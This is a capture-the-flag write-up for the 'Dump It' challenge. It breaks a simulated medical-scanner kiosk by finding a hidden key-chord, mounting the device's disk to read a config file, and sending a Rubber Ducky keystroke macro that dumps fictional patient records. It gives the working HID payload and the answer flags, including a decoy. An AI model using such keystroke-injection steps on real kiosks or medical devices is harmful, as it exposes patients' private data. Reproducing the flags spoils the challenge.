# Dump It - Writeup

**Challenge:** Dump It
**Points:** 150
**Category:** Web / Reverse Engineering
**Flag:** `deadface{un10ck3d_k10sk_qu4cks_b4ck}`

## Description

> The ScanWorks kiosk is supposed to be locked down to the touchscreen. But it's really just a browser in a box, and it never stopped listening to the keyboard. There should be a maintenance console one key-chord away, with a debug function that will dump data for you - if you tell it the right thing to dump.

## Solution

### 1. Explore the Application

The target is a web-based medical device simulator at `http://emedra.dctf.io:8080/`. It's a Vite-based SPA that renders a 3D model of an "Emedra CerebraScan CS-9000" device with interactive hotspots:

- Touchscreen (opens ScanWorks kiosk)
- HDMI Port
- USB-A Port
- USB-C Maintenance Port
- Asset Label (links to a field service manual PDF)

Available tools to connect to ports:
- HDMI Cable
- DisplayPort Cable (incompatible with all ports)
- Live Linux USB-A
- Rubber Ducky USB-A
- BLE Sniffer USB-A

### 2. Find the Key-Chord

Examining the frontend JavaScript (`/assets/hidMacro-CuHggWtU.js`), the Rubber Ducky HID Macro module contains a template payload:

```
REM Rubber Ducky payload — target: ScanWorks kiosk
DELAY 500
CTRL-ALT F12
DELAY 300
STRING <function>(<table>)
ENTER
```

This reveals that **`CTRL-ALT F12`** is the key-chord that opens the hidden maintenance console. The payload then types a function call `<function>(<table>)` and presses ENTER.

### 3. Find the Debug Function

To discover what function and table to use, we need to access the device's internal storage:

1. Connect the **Live Linux USB-A** to the **USB-A Port** via `/api/connect`:
   ```
   POST /api/connect {"tool":"live-linux","port":"usb-a"}
   → token: <terminal-token>
   ```

2. Use the shell API (`/api/shell`) to explore:
   ```
   POST /api/shell {"token":"<token>","line":"sudo mount /dev/sda2 /mnt"}
   ```

3. Read the configuration file:
   ```
   POST /api/shell {"token":"<token>","line":"cat /mnt/opt/scanworks/config.yaml"}
   ```

The config reveals:
```yaml
debug_console:
  enabled: true
  function: debug.dump
  tables: [patients, calibration, audit]
```

So the debug function is `debug.dump` and it accepts table names: `patients`, `calibration`, or `audit`.

### 4. Execute the Debug Dump

1. Connect the **Rubber Ducky USB-A** to the **USB-A Port**:
   ```
   POST /api/connect {"tool":"rubber-ducky","port":"usb-a"}
   → token: <hid-token>
   ```

2. Send a HID macro payload that opens the maintenance console and dumps the patients table:
   ```
   POST /api/kiosk/hid
   {"token":"<hid-token>","macro":"DELAY 500\nCTRL-ALT F12\nDELAY 300\nSTRING debug.dump(patients)\nENTER"}
   ```

### 5. Result

The maintenance console responds:
```
ScanWorks debug console (NeuraOS 2.3.1)
> debug.dump(patients)
[100413] Gideon Marsh  | study: Cranial perfusion, contrast
[100666] Lenora Crane  | study: Baseline screen
[100228] Osric Vane    | study: Post-op follow-up
debug-token: deadface{un10ck3d_k10sk_qu4cks_b4ck}
```

The `debug-token` is the flag.

### Other Tables

- `debug.dump(calibration)` → `[calibration] report_above=0.35 gain=1.00 signature=ok`
- `debug.dump(audit)` → `[audit] log empty`

Only the `patients` table contained the flag.

### Decoy

The config file also contained an API key `deadface{h4rdc0d3d_k3ys_1n_th3_c0nf1g}` which is a decoy flag — not the actual answer.

## Tools Used

- Browser DevTools / Network inspection
- REST API calls (`/api/connect`, `/api/shell`, `/api/kiosk/hid`)
- Linux shell (via Live Linux USB terminal)
- File system exploration (mounted device storage)